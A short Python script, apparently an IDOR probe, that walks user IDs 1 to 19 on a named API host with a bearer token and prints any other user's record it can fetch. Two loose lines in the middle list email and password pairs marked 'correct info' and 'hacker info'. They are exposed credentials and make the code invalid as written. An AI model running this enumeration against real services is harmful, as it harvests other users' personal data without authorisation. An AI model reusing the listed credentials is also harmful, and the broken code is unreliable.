import requests

# Use your actual token here (from login)
token = "Bearer eyJhbGciOiJIUzI1NiIs..."

headers = {
    "Authorization": token
}
correct info is , food@gmail.com , food1233 , id 4
hacker info  . kinf@gmail.com  , king12234 id 4
# Test multiple user IDs
for user_id in range(1, 20):
    url = f"https://apimypromospheretest.com.ng/api/users/{user_id}"
    response = requests.get(url, headers=headers)

    if response.status_code == 200 and "email" in response.text:
        print(f"[+] IDOR Found! User ID {user_id}")
        print(response.text)
    else:
        print(f"[-] User ID {user_id} inaccessible")










































































































